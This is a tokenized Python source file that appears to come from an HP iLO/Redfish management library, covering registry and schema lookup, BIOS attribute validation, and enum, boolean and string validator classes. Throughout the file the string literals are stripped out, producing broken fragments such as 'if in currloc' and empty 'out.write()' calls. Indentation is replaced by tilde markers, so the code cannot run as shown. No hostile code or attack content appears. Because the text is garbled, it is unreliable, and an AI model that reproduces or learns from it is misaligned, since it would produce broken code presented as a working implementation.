if hasattr ( self , ) and isinstance ( self . Items , list ) : \n 
~~~ for entry in self . Items : \n 
~~~ if entry and ( in entry and regname . lower ( ) in entry [ ] . lower ( ) ) : \n 
~~~ regentry = RepoRegistryEntry . parse ( entry ) \n 
regentry . set_root ( self . _root ) \n 
result = regentry \n 
break \n 
\n 
~~ ~~ ~~ return result \n 
\n 
\n 
~~ ~~ class RepoBaseEntry ( RisObject ) : \n 
~~~ """Represents an entry in the Classes registry""" \n 
def __init__ ( self , d ) : \n 
~~~ super ( RepoBaseEntry , self ) . __init__ ( d ) \n 
self . _root = None \n 
\n 
~~ def set_root ( self , newroot ) : \n 
~~~ """Set new root\n\n        :param newroot: new root to be set.\n        :type newroot: str.\n\n        """ \n 
self . _root = newroot \n 
\n 
~~ def _read_location_file ( self , currloc , errlist ) : \n 
~~~ """Return results from locations\n\n        :param currdict: current selection dictionary.\n        :type currdict: dict.\n        :param errlist: list containing found errors.\n        :type errlist: list.\n\n        """ \n 
result = None \n 
if in currloc : \n 
~~~ root = os . path . normpath ( self . _root ) \n 
xref = os . path . normpath ( currloc . Uri . extref ) . lstrip ( os . path . sep ) \n 
fqpath = os . path . join ( root , xref ) \n 
\n 
if not os . path . isfile ( fqpath ) : \n 
~~~ errlist . append ( SchemaValidationError ( \n 
u"Unable to location ArchiveUri \'%s\'" % fqpath ) ) \n 
~~ else : \n 
~~~ result = None \n 
if fqpath . endswith ( ) : \n 
~~~ result = open ( fqpath ) . read ( ) \n 
\n 
~~ ~~ ~~ return result \n 
\n 
\n 
~~ ~~ class RepoRegistryEntry ( RepoBaseEntry ) : \n 
~~~ """Represents an entry in the Classes registry""" \n 
def __init__ ( self , d ) : \n 
~~~ super ( RepoRegistryEntry , self ) . __init__ ( d ) \n 
\n 
~~ def validate ( self , tdict , errlist = None , selector = None , currdict = None , checkall = False , monolith = None , newarg = None ) : \n 
~~~ """Load the schema file and validate tdict against it\n\n        :param tdict: the dictionary to test against.\n        :type tdict: dict.\n        :param errlist: list containing found errors.\n        :type errlist: list.\n        :param selector: the type selection for the get operation.\n        :type selector: str.\n        :param currdict: current selection dictionary.\n        :type currdict: dict.\n        :param checkall: flag to determine if check all should be enabled.\n        :type checkall: boolean.\n        :param monolith: full data model retrieved from server.\n        :type monolith: dict.\n        :param newargs: list of multi level properties to be modified.\n        :type newargs: list.\n\n        """ \n 
if not errlist : \n 
~~~ errlist = list ( ) \n 
\n 
~~ reg = self . get_registry_model ( errlist = errlist , currdict = currdict , monolith = monolith , newarg = newarg ) \n 
\n 
if reg and not checkall : \n 
~~~ try : \n 
~~~ if reg [ selector ] . readonly : \n 
~~~ return True \n 
~~ ~~ except BaseException : \n 
~~~ pass \n 
~~ else : \n 
~~~ pass \n 
\n 
~~ results = reg . validate_attribute_values ( tdict ) \n 
errlist . extend ( results ) \n 
~~ elif checkall and selector is None : \n 
~~~ results = reg . validate_attribute_values ( tdict ) \n 
errlist . extend ( results ) \n 
~~ else : \n 
~~~ errlist . append ( RegistryValidationError ( ) ) \n 
\n 
~~ if errlist : \n 
~~~ return errlist \n 
\n 
~~ ~~ def validate_bios_version ( self , tdict , errlist = None , selector = None , checkall = False , currdict = None , monolith = None ) : \n 
~~~ """BIOS VERSION. Load the schema file and validate tdict against it\n\n        :param tdict: the dictionary to test against.\n        :type tdict: dict.\n        :param errlist: list containing found errors.\n        :type errlist: list.\n        :param selector: the type selection for the get operation.\n        :type selector: str.\n        :param currdict: current selection dictionary.\n        :type currdict: dict.\n        :param checkall: flag to determine if check all should be enabled.\n        :type checkall: boolean.\n        :param monolith: full data model retrieved from server.\n        :type monolith: dict.\n        :param newargs: list of multi level properties to be modified.\n        :type newargs: list.\n\n        """ \n 
if not errlist : \n 
~~~ errlist = list ( ) \n 
\n 
~~ reg = self . get_registry_model_bios_version ( errlist = errlist , currdict = currdict , monolith = monolith ) \n 
\n 
if reg and not checkall : \n 
~~~ for item in reg . Attributes : \n 
~~~ if not item [ "Name" ] == selector : \n 
~~~ continue \n 
\n 
\n 
~~ if item [ "ReadOnly" ] is True : \n 
~~~ return \n 
\n 
~~ try : \n 
~~~ if item [ "IsSystemUniqueProperty" ] is True : \n 
~~~ return \n 
~~ ~~ except BaseException : \n 
~~~ continue \n 
~~ else : \n 
~~~ continue \n 
\n 
~~ ~~ results = reg . validate_att_val_bios ( tdict ) \n 
errlist . extend ( results ) \n 
~~ elif checkall and selector is None : \n 
~~~ results = reg . validate_att_val_bios ( tdict ) \n 
errlist . extend ( results ) \n 
~~ else : \n 
~~~ errlist . append ( RegistryValidationError ( ) ) \n 
\n 
~~ if errlist : \n 
~~~ return errlist \n 
\n 
~~ ~~ def validate_deprecated ( self , tdict , errlist = None ) : \n 
~~~ """Load the schema file and validate tdict against it\n\n        :param tdict: the dictionary to test against.\n        :type tdict: list.\n        :param errlist: list containing found errors.\n        :type errlist: list.\n\n        """ \n 
if not errlist : \n 
~~~ errlist = list ( ) \n 
\n 
~~ if not hasattr ( self , ) : \n 
~~~ errlist . append ( RegistryValidationError ( ) ) \n 
return errlist \n 
\n 
~~ currloc = None \n 
defloc = None \n 
langcode = \n 
\n 
for loc in self . Location : \n 
~~~ for loclang in loc . keys ( ) : \n 
~~~ if loclang . lower ( ) == langcode . lower ( ) : \n 
~~~ currloc = loc [ loclang ] \n 
break \n 
~~ elif loclang . lower ( ) == : \n 
~~~ defloc = loc [ loclang ] \n 
\n 
~~ ~~ ~~ if not currloc : \n 
\n 
~~~ currloc = defloc \n 
\n 
~~ if not currloc : \n 
~~~ errlist . append ( RegistryValidationError ( ) ) \n 
return \n 
\n 
~~ location_file = self . _read_location_file ( currloc , errlist = errlist ) \n 
if not location_file : \n 
~~~ errlist . append ( RegistryValidationError ( ) ) \n 
~~ else : \n 
~~~ jsonreg = json . loads ( location_file ) \n 
if in jsonreg : \n 
~~~ if in jsonreg and jsonreg [ ] == : \n 
~~~ reg = HpPropertiesRegistry . parse ( jsonreg [ ] ) \n 
results = reg . validate_attribute_values ( tdict ) \n 
errlist . extend ( results ) \n 
\n 
~~ ~~ ~~ ~~ def get_registry_model ( self , currdict = None , monolith = None , errlist = None , skipcommit = False , searchtype = None , newarg = None , latestschema = None ) : \n 
~~~ """Load the schema file and find the registry model if available\n\n        :param currdict: current selection dictionary.\n        :type currdict: dict.\n        :param monolith: full data model retrieved from server.\n        :type monolith: dict.\n        :param errlist: list containing found errors.\n        :type errlist: list.\n        :param skipcommit: flag to determine if commit should be skipped.\n        :type skipcommit: boolean.\n        :param searchtype: classifier for the current search.\n        :type searchtype: str.\n        :param newargs: list of multi level properties to be modified.\n        :type newargs: list.\n        :param latestschema: flag to determine if we should use smart schema.\n        :type latestschema: boolean.\n\n        """ \n 
if not errlist : \n 
~~~ errlist = list ( ) \n 
\n 
~~ if not hasattr ( self , ) : \n 
~~~ errlist . append ( RegistryValidationError ( \n 
) ) \n 
return None \n 
\n 
~~ currloc = None \n 
defloc = "en" \n 
langcode = list ( locale . getdefaultlocale ( ) ) \n 
\n 
if not langcode [ 0 ] : \n 
~~~ langcode [ 0 ] = "en" \n 
\n 
~~ for loc in self . Location : \n 
~~~ locationlanguage = loc [ "Language" ] . lower ( ) \n 
locationlanguage = locationlanguage . replace ( "-" , "_" ) \n 
\n 
if locationlanguage in langcode [ 0 ] . lower ( ) : \n 
~~~ currloc = loc \n 
break \n 
\n 
~~ ~~ if not currloc : \n 
\n 
~~~ currloc = defloc \n 
\n 
~~ if not currloc : \n 
~~~ errlist . append ( RegistryValidationError ( ) ) \n 
return None \n 
\n 
~~ if not searchtype : \n 
~~~ searchtype = "ob" \n 
\n 
~~ location_file = None \n 
if currdict and monolith : \n 
~~~ for itemtype in monolith . types : \n 
~~~ if itemtype . lower ( ) . startswith ( searchtype . lower ( ) ) and in monolith . types [ itemtype ] : \n 
~~~ for instance in monolith . types [ itemtype ] [ ] : \n 
~~~ try : \n 
~~~ if monolith . is_redfish : \n 
~~~ currtype = currdict [ instance . _typestring ] . split ( ) [ - 1 ] \n 
currtype = currtype . split ( ) [ 0 ] + \n 
~~ else : \n 
~~~ currtype = currdict [ instance . _typestring ] \n 
\n 
~~ if latestschema : \n 
~~~ currtype = currdict [ instance . _typestring ] . split ( ) [ : 1 ] \n 
insttype = instance . resp . dict [ "title" ] . split ( ) [ : 1 ] \n 
\n 
if currtype == insttype or currtype == instance . resp . dict [ "oldtitle" ] . split ( ) [ : 1 ] : \n 
~~~ location_file = instance . resp . dict \n 
break \n 
~~ ~~ elif searchtype == "ob" and instance . resp . dict [ "title" ] . startswith ( currtype ) or "oldtitle" in instance . resp . dict . keys ( ) and currdict [ instance . _typestring ] == instance . resp . dict [ "oldtitle" ] : \n 
~~~ location_file = instance . resp . dict \n 
break \n 
~~ elif searchtype != "ob" and currdict [ instance . _typestring ] in instance . resp . dict [ "RegistryPrefix" ] : \n 
~~~ location_file = instance . resp . dict \n 
break \n 
~~ ~~ except BaseException : \n 
~~~ pass \n 
~~ else : \n 
~~~ pass \n 
\n 
~~ ~~ ~~ if location_file : \n 
~~~ break \n 
~~ ~~ ~~ else : \n 
~~~ location_file = self . _read_location_file ( currloc , errlist = errlist ) \n 
\n 
~~ if not location_file : \n 
~~~ errlist . append ( RegistryValidationError ( ) ) \n 
~~ else : \n 
~~~ if currdict and monolith : \n 
~~~ jsonreg = json . loads ( json . dumps ( location_file , indent = 2 , cls = JSONEncoder ) ) \n 
~~ else : \n 
~~~ jsonreg = json . loads ( location_file ) \n 
\n 
~~ if skipcommit : \n 
~~~ return jsonreg [ "Messages" ] \n 
\n 
~~ if in jsonreg : \n 
~~~ regitem = jsonreg [ ] \n 
reg = HpPropertiesRegistry . parse ( regitem ) \n 
\n 
if newarg : \n 
~~~ regcopy = reg \n 
for arg in newarg [ : - 1 ] : \n 
~~~ try : \n 
~~~ if in regcopy [ arg ] . iterkeys ( ) and ( in regcopy [ arg ] . iterkeys ( ) ) : \n 
~~~ regcopy [ arg ] [ ] . update ( regcopy [ arg ] [ ] ) \n 
regcopy = regcopy [ arg ] [ "properties" ] \n 
\n 
for pattern in regcopy . iterkeys ( ) : \n 
~~~ test = re . compile ( pattern ) \n 
nextarg = newarg [ newarg . index ( arg ) + 1 ] \n 
match = test . match ( nextarg ) \n 
\n 
if match : \n 
~~~ regcopy [ nextarg ] = regcopy . pop ( pattern ) \n 
break \n 
~~ ~~ ~~ elif in regcopy [ arg ] : \n 
~~~ oneof = regcopy [ arg ] [ ] \n 
for item in oneof : \n 
~~~ regcopy = item [ ] \n 
\n 
if not arg == newarg [ - 1 ] : \n 
~~~ try : \n 
~~~ nextitem = newarg [ newarg . index ( arg ) + 1 ] \n 
regcopy [ nextitem ] \n 
break \n 
~~ except Exception : \n 
~~~ continue \n 
~~ ~~ ~~ ~~ else : \n 
~~~ regcopy = regcopy [ arg ] [ "properties" ] \n 
~~ ~~ except Exception : \n 
~~~ try : \n 
~~~ regcopy = regcopy [ arg ] [ ] \n 
for pattern in regcopy . iterkeys ( ) : \n 
~~~ test = re . compile ( pattern ) \n 
nextarg = newarg [ newarg . index ( arg ) + 1 ] \n 
match = test . match ( nextarg ) \n 
\n 
if match : \n 
~~~ patterninfo = regcopy . pop ( pattern ) \n 
regcopy [ nextarg ] = patterninfo \n 
~~ ~~ ~~ except BaseException : \n 
~~~ return None \n 
\n 
~~ ~~ ~~ reg = regcopy \n 
\n 
~~ ~~ return reg \n 
~~ return None \n 
\n 
~~ def get_registry_model_bios_version ( self , currdict = None , monolith = None , errlist = None ) : \n 
~~~ """BIOS VERSION Load the schema file and find the registry model""" \n 
""" if available.\n\n        :param currdict: current selection dictionary.\n        :type currdict: dict.\n        :param monolith: full data model retrieved from server.\n        :type monolith: dict.\n        :param errlist: list containing found errors.\n        :type errlist: list.\n\n        """ \n 
if not errlist : \n 
~~~ errlist = list ( ) \n 
\n 
~~ if not hasattr ( self , ) : \n 
~~~ errlist . append ( RegistryValidationError ( \n 
) ) \n 
return None \n 
\n 
~~ currloc = None \n 
defloc = "en" \n 
langcode = list ( locale . getdefaultlocale ( ) ) \n 
\n 
if not langcode [ 0 ] : \n 
~~~ langcode [ 0 ] = "en" \n 
\n 
~~ for loc in self . Location : \n 
~~~ locationlanguage = loc [ "Language" ] . lower ( ) \n 
locationlanguage = locationlanguage . replace ( "-" , "_" ) \n 
if locationlanguage in langcode [ 0 ] . lower ( ) : \n 
~~~ currloc = loc \n 
break \n 
\n 
~~ ~~ if not currloc : \n 
\n 
~~~ currloc = defloc \n 
\n 
~~ if not currloc : \n 
~~~ errlist . append ( RegistryValidationError ( \n 
) ) \n 
return None \n 
\n 
~~ location_file = None \n 
if currdict and monolith : \n 
~~~ for itemtype in monolith . types : \n 
~~~ if "HpBiosAttributeRegistrySchema." in itemtype and in monolith . types [ itemtype ] : \n 
~~~ for instance in monolith . types [ itemtype ] [ ] : \n 
~~~ location_file = instance . resp . dict \n 
break \n 
\n 
~~ ~~ if location_file : \n 
~~~ break \n 
~~ ~~ ~~ else : \n 
~~~ location_file = self . _read_location_file ( currloc , errlist = errlist ) \n 
\n 
~~ if not location_file : \n 
~~~ errlist . append ( RegistryValidationError ( ) ) \n 
~~ else : \n 
~~~ if currdict and monolith : \n 
~~~ jsonreg = json . loads ( json . dumps ( location_file , indent = 2 , cls = JSONEncoder ) ) \n 
~~ else : \n 
~~~ jsonreg = json . loads ( location_file ) \n 
\n 
~~ if in jsonreg : \n 
~~~ regitem = jsonreg [ ] \n 
reg = HpPropertiesRegistry . parse ( regitem ) \n 
return reg \n 
\n 
~~ ~~ return None \n 
\n 
\n 
~~ ~~ class RepoSchemaEntry ( RepoBaseEntry ) : \n 
~~~ """Represents an entry in the Classes registry""" \n 
def __init__ ( self , item ) : \n 
~~~ super ( RepoSchemaEntry , self ) . __init__ ( item ) \n 
self . _root = None \n 
\n 
~~ def set_root ( self , newroot ) : \n 
~~~ """Set new root\n\n        :param newroot: new root to be set.\n        :type newroot: str.\n\n        """ \n 
self . _root = newroot \n 
\n 
~~ def _read_location_file ( self , currloc , errlist ) : \n 
~~~ """Return results from locations\n\n        :param currdict: current selection dictionary.\n        :type currdict: dict.\n        :param errlist: list containing found errors.\n        :type errlist: list.\n\n        """ \n 
if in currloc and in currloc : \n 
~~~ fqpath = os . path . join ( self . _root , currloc . ArchiveUri . xref . lstrip ( os . path . sep ) ) \n 
if not os . path . isfile ( fqpath ) : \n 
~~~ errlist . append ( SchemaValidationError ( u"Unable to location " "ArchiveUri \'%s\'" % fqpath ) ) \n 
~~ else : \n 
~~~ archive_file = currloc . ArchiveFile \n 
archive_fh = None \n 
result = None \n 
\n 
if fqpath . endswith ( ) : \n 
~~~ archive_fh = zipfile . ZipFile ( fqpath ) \n 
\n 
infolist = archive_fh . infolist ( ) \n 
for i in infolist : \n 
~~~ if i . filename . lower ( ) == archive_file . lower ( ) : \n 
~~~ jsonsch_fh = archive_fh . open ( i ) \n 
result = jsonsch_fh . read ( ) \n 
jsonsch_fh . close ( ) \n 
\n 
~~ ~~ archive_fh . close ( ) \n 
\n 
~~ ~~ ~~ return result \n 
\n 
~~ def validate ( self , tdict , errlist = None ) : \n 
~~~ """Load the schema file and validate tdict against it\n\n        :param tdict: the dictionary to test against.\n        :type tdict: list.\n        :param errlist: list containing found errors.\n        :type errlist: list.\n\n        """ \n 
if not errlist : \n 
~~~ errlist = list ( ) \n 
\n 
~~ result = list ( ) \n 
if not hasattr ( self , ) : \n 
~~~ result . append ( SchemaValidationError ( ) ) \n 
return result \n 
\n 
~~ currloc = None \n 
defloc = None \n 
langcode = \n 
for loc in self . Location : \n 
~~~ for loclang in loc . keys ( ) : \n 
~~~ if loclang . lower ( ) == langcode . lower ( ) : \n 
~~~ currloc = loc [ loclang ] \n 
break \n 
~~ elif loclang . lower ( ) == : \n 
~~~ defloc = loc [ loclang ] \n 
\n 
~~ ~~ ~~ if not currloc : \n 
\n 
~~~ currloc = defloc \n 
\n 
~~ if not currloc : \n 
~~~ result . append ( SchemaValidationError ( \n 
) ) \n 
return \n 
\n 
~~ location_file = self . _read_location_file ( currloc , errlist = result ) \n 
if not location_file : \n 
~~~ result . append ( SchemaValidationError ( ) ) \n 
~~ else : \n 
~~~ jsonsch = json . loads ( location_file ) \n 
validictory . validate ( tdict , jsonsch ) \n 
\n 
\n 
~~ ~~ ~~ class HpPropertiesRegistry ( RisObject ) : \n 
~~~ """Models the HpPropertiesRegistry file""" \n 
def __init__ ( self , d ) : \n 
~~~ super ( HpPropertiesRegistry , self ) . __init__ ( d ) \n 
\n 
~~ def validate_attribute_values ( self , tdict ) : \n 
~~~ """Look for tdict in attribute list and attempt to validate its value\n\n        :param tdict: the dictionary to test against.\n        :type tdict: list.\n\n        """ \n 
result = list ( ) \n 
\n 
for tkey in tdict : \n 
~~~ try : \n 
~~~ if self [ tkey ] and hasattr ( self [ tkey ] , "type" ) : \n 
~~~ temp = self . validate_attribute ( self [ tkey ] , tdict [ tkey ] , tkey ) \n 
\n 
for err in temp : \n 
~~~ if isinstance ( err , RegistryValidationError ) : \n 
~~~ if err . reg : \n 
~~~ err . sel = tkey \n 
\n 
~~ ~~ ~~ result . extend ( temp ) \n 
~~ ~~ except Exception : \n 
~~~ pass \n 
\n 
~~ ~~ return result \n 
\n 
~~ def validate_att_val_bios ( self , tdict ) : \n 
~~~ """Look for tdict in attribute list and attempt to validate its value\n\n        :param tdict: the dictionary to test against.\n        :type tdict: list.\n\n        """ \n 
result = list ( ) \n 
\n 
for tkey in tdict : \n 
~~~ for item in self . Attributes : \n 
~~~ try : \n 
~~~ if item [ "Name" ] == tkey and hasattr ( item , "Type" ) : \n 
~~~ temp = self . validate_attribute ( item , tdict [ tkey ] , tkey ) \n 
\n 
for err in temp : \n 
~~~ if isinstance ( err , RegistryValidationError ) : \n 
~~~ if err . reg : \n 
~~~ err . sel = tkey \n 
\n 
~~ ~~ ~~ result . extend ( temp ) \n 
break \n 
~~ ~~ except Exception : \n 
~~~ pass \n 
\n 
~~ ~~ ~~ return result \n 
\n 
~~ def get_validator ( self , attrname , newargs = None , oneof = None ) : \n 
~~~ """Returns attribute validator type\n\n        :param attrname: attribute name to be used for validation.\n        :type attrname: str.\n        :param newargs: list of multi level properties to be modified.\n        :type newargs: list.\n        :param oneof: special string for "oneof" options within validation.\n        :type oneof: list.\n\n        """ \n 
if oneof : \n 
~~~ self = oneof \n 
\n 
~~ if newargs : \n 
~~~ for arg in newargs : \n 
~~~ try : \n 
~~~ self = self [ ] \n 
~~ except Exception : \n 
~~~ pass \n 
\n 
~~ if not hasattr ( self , arg ) : \n 
~~~ return None \n 
~~ elif not arg == newargs [ - 1 ] : \n 
~~~ self = self [ arg ] \n 
\n 
~~ ~~ ~~ if not hasattr ( self , attrname ) : \n 
~~~ return None \n 
\n 
~~ validator = None \n 
if EnumValidator . is_type ( self [ attrname ] ) : \n 
~~~ validator = EnumValidator . parse ( self [ attrname ] ) \n 
~~ elif StringValidator . is_type ( self [ attrname ] ) : \n 
~~~ validator = StringValidator . parse ( self [ attrname ] ) \n 
~~ elif ObjectValidator . is_type ( self [ attrname ] ) : \n 
~~~ validator = ObjectValidator . parse ( self [ attrname ] ) \n 
~~ elif IntegerValidator . is_type ( self [ attrname ] ) : \n 
~~~ validator = IntegerValidator . parse ( self [ attrname ] ) \n 
~~ elif BoolValidator . is_type ( self [ attrname ] ) : \n 
~~~ validator = BoolValidator . parse ( self [ attrname ] ) \n 
~~ elif PasswordValidator . is_type ( self [ attrname ] ) : \n 
~~~ validator = PasswordValidator . parse ( self [ attrname ] ) \n 
~~ elif in self [ attrname ] . keys ( ) : \n 
~~~ for item in self [ attrname ] [ ] : \n 
~~~ validator = self . get_validator ( attrname , newargs , HpPropertiesRegistry ( { attrname : item } ) ) \n 
if validator : \n 
~~~ break \n 
~~ ~~ ~~ return validator \n 
\n 
~~ def get_validator_bios ( self , attrname ) : \n 
~~~ """Returns attribute validator type\n\n        :param attrname: attribute name to be used for validation.\n        :type attrname: str.\n\n        """ \n 
for item in self . Attributes : \n 
~~~ if item [ "Name" ] == attrname : \n 
~~~ validator = None \n 
if EnumValidator . is_type ( item ) : \n 
~~~ validator = EnumValidator . parse ( item ) \n 
~~ elif StringValidator . is_type ( item ) : \n 
~~~ validator = StringValidator . parse ( item ) \n 
~~ elif IntegerValidator . is_type ( item ) : \n 
~~~ validator = IntegerValidator . parse ( item ) \n 
~~ elif BoolValidator . is_type ( item ) : \n 
~~~ validator = BoolValidator . parse ( item ) \n 
~~ elif ObjectValidator . is_type ( item ) : \n 
~~~ validator = ObjectValidator . parse ( item ) \n 
~~ elif PasswordValidator . is_type ( item ) : \n 
~~~ validator = PasswordValidator . parse ( item ) \n 
\n 
~~ return validator \n 
\n 
~~ ~~ return None \n 
\n 
~~ def validate_attribute ( self , attrentry , attrval , name ) : \n 
~~~ """Function to validate attribute against iLO schema\n\n        :param attrname: attribute name to be used for validation.\n        :type attrname: str.\n        :param attrval: attribute value to be used for validation.\n        :type attrval: str.\n        :param name: clean name for outputting.\n        :type name: str.\n\n        """ \n 
result = list ( ) \n 
validator = None \n 
\n 
if EnumValidator . is_type ( attrentry ) : \n 
~~~ validator = EnumValidator . parse ( attrentry ) \n 
~~ elif StringValidator . is_type ( attrentry ) : \n 
~~~ validator = StringValidator . parse ( attrentry ) \n 
~~ elif IntegerValidator . is_type ( attrentry ) : \n 
~~~ validator = IntegerValidator . parse ( attrentry ) \n 
~~ elif BoolValidator . is_type ( attrentry ) : \n 
~~~ validator = BoolValidator . parse ( attrentry ) \n 
~~ elif ObjectValidator . is_type ( attrentry ) : \n 
~~~ validator = ObjectValidator . parse ( attrentry ) \n 
~~ elif PasswordValidator . is_type ( attrentry ) : \n 
~~~ validator = PasswordValidator . parse ( attrentry ) \n 
~~ else : \n 
~~~ raise UnknownValidatorError ( attrentry ) \n 
\n 
~~ if validator : \n 
~~~ result . extend ( validator . validate ( attrval , name ) ) \n 
~~ return result \n 
\n 
\n 
~~ ~~ class BaseValidator ( RisObject ) : \n 
~~~ """Base validator class""" \n 
def __init__ ( self , d ) : \n 
~~~ super ( BaseValidator , self ) . __init__ ( d ) \n 
\n 
~~ def validate ( self ) : \n 
~~~ """Overridable function for validation """ \n 
raise RuntimeError ( ) \n 
\n 
\n 
~~ ~~ class EnumValidator ( BaseValidator ) : \n 
~~~ """Enum validator class""" \n 
def __init__ ( self , d ) : \n 
~~~ super ( EnumValidator , self ) . __init__ ( d ) \n 
\n 
~~ @ staticmethod \n 
def is_type ( attrentry ) : \n 
~~~ """Validate that the type is enumeration\n\n        :param attrname: attribute name to be used for validation.\n        :type attrname: str.\n\n        """ \n 
if in attrentry : \n 
~~~ if isinstance ( attrentry [ ] , list ) : \n 
~~~ for item in attrentry [ ] : \n 
~~~ if item . lower ( ) == : \n 
~~~ return True \n 
~~ elif in attrentry and item . lower ( ) == : \n 
~~~ return True \n 
~~ ~~ ~~ elif in attrentry and attrentry [ ] == "array" : \n 
~~~ for key , value in attrentry [ ] . iteritems ( ) : \n 
~~~ if key . lower ( ) == "type" and value . lower ( ) == : \n 
~~~ return True \n 
~~ ~~ ~~ else : \n 
~~~ if attrentry [ ] . lower ( ) == : \n 
~~~ return True \n 
~~ elif in attrentry and attrentry [ ] . lower ( ) == : \n 
~~~ return True \n 
~~ ~~ ~~ elif in attrentry : \n 
~~~ if attrentry [ ] . lower ( ) == : \n 
~~~ return True \n 
\n 
~~ ~~ return False \n 
\n 
~~ def validate ( self , newval , name ) : \n 
~~~ """Validate against iLO schema\n\n        :param newval: new value to be used for validation.\n        :type newval: str.\n        :param name: clean name for outputting.\n        :type name: str.\n\n        """ \n 
result = list ( ) \n 
\n 
try : \n 
~~~ for possibleval in self . enum : \n 
~~~ if possibleval . lower ( ) == newval . lower ( ) : \n 
~~~ return result \n 
~~ ~~ ~~ except Exception : \n 
~~~ for possibleval in self . Value : \n 
~~~ if possibleval . ValueName . lower ( ) == str ( newval ) . lower ( ) : \n 
~~~ return result \n 
\n 
~~ ~~ ~~ result . append ( RegistryValidationError ( u"\'%s\' is not a valid setting " \n 
"for \'%s\'" % ( newval , name ) , \n 
regentry = self ) ) \n 
\n 
return result \n 
\n 
~~ def print_help ( self , name , out = sys . stdout ) : \n 
~~~ """Info command helper function for print outs\n\n        :param name: clean name for outputting.\n        :type name: str.\n        :param out: output type for verbosity.\n        :type out: output type.\n\n        """ \n 
wrapper = textwrap . TextWrapper ( ) \n 
wrapper . initial_indent = * 4 \n 
wrapper . subsequent_indent = * 4 \n 
\n 
out . write ( ) \n 
out . write ( % wrapper . fill ( % name ) ) \n 
out . write ( ) \n 
\n 
if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
out . write ( ) \n 
\n 
~~ if in self and isinstance ( self [ ] , list ) : \n 
~~~ out . write ( ) \n 
for item in self [ ] : \n 
~~~ out . write ( % wrapper . fill ( % item ) ) \n 
~~ out . write ( ) \n 
~~ elif in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
~~ elif in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
~~ elif in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ out . write ( ) \n 
try : \n 
~~~ for possibleval in self . enum : \n 
~~~ out . write ( % possibleval ) \n 
~~ ~~ except Exception : \n 
~~~ for possibleval in self . Value : \n 
~~~ out . write ( % possibleval ) \n 
~~ ~~ out . write ( ) \n 
\n 
\n 
~~ ~~ class BoolValidator ( BaseValidator ) : \n 
~~~ """Bool validator class""" \n 
def __init__ ( self , d ) : \n 
~~~ super ( BoolValidator , self ) . __init__ ( d ) \n 
\n 
~~ @ staticmethod \n 
def is_type ( attrentry ) : \n 
~~~ """Validate that the type is boolean\n\n        :param attrentry: attribute entry containing data to be validated.\n        :type attrentry: str.\n\n        """ \n 
if in attrentry : \n 
~~~ if isinstance ( attrentry [ ] , list ) : \n 
~~~ for item in attrentry [ ] : \n 
~~~ if item . lower ( ) == : \n 
~~~ return True \n 
~~ ~~ ~~ elif attrentry [ ] == "array" : \n 
~~~ for key , value in attrentry [ ] . iteritems ( ) : \n 
~~~ if key . lower ( ) == "type" and value . lower ( ) == : \n 
~~~ return True \n 
~~ ~~ ~~ else : \n 
~~~ if attrentry [ ] . lower ( ) == : \n 
~~~ return True \n 
~~ ~~ ~~ elif in attrentry : \n 
~~~ if attrentry [ ] . lower ( ) == : \n 
~~~ return True \n 
\n 
~~ ~~ return False \n 
\n 
~~ def validate ( self , newval , name ) : \n 
~~~ """Validate against iLO schema\n\n        :param newval: new value to be used for validation.\n        :type newval: str.\n        :param name: clean name for outputting.\n        :type name: str.\n\n        """ \n 
result = list ( ) \n 
if newval is False or newval is True : \n 
~~~ return result \n 
\n 
~~ result . append ( \n 
RegistryValidationError ( \n 
u"\'%s\' is not a valid setting for \'%s\'" % ( newval , name ) , \n 
regentry = self \n 
) \n 
) \n 
return result \n 
\n 
~~ def print_help ( self , name , out = sys . stdout ) : \n 
~~~ """Info command helper function for print outs\n\n        :param name: clean name for outputting.\n        :type name: str.\n        :param out: output type for verbosity.\n        :type out: output type.\n\n        """ \n 
wrapper = textwrap . TextWrapper ( ) \n 
wrapper . initial_indent = * 4 \n 
wrapper . subsequent_indent = * 4 \n 
\n 
out . write ( ) \n 
out . write ( % wrapper . fill ( % name ) ) \n 
out . write ( ) \n 
\n 
if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
out . write ( ) \n 
\n 
~~ if in self and isinstance ( self [ ] , list ) : \n 
~~~ out . write ( ) \n 
for item in self [ ] : \n 
~~~ out . write ( % wrapper . fill ( % item ) ) \n 
~~ out . write ( ) \n 
~~ elif in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
~~ elif in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ if in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
~~ elif in self : \n 
~~~ out . write ( ) \n 
out . write ( % wrapper . fill ( % self ) ) \n 
out . write ( ) \n 
\n 
~~ out . write ( ) \n 
out . write ( ) \n 
out . write ( ) \n 
\n 
\n 
~~ ~~ class StringValidator ( BaseValidator ) : \n 
~~~ """Constructor """ \n 
def __init__ ( self , d ) : \n 
~~~ super ( StringValidator , self ) . __init__ ( d ) \n 
\n 
~~ @ staticmethod \n 
def is_type ( attrentry ) : \n 
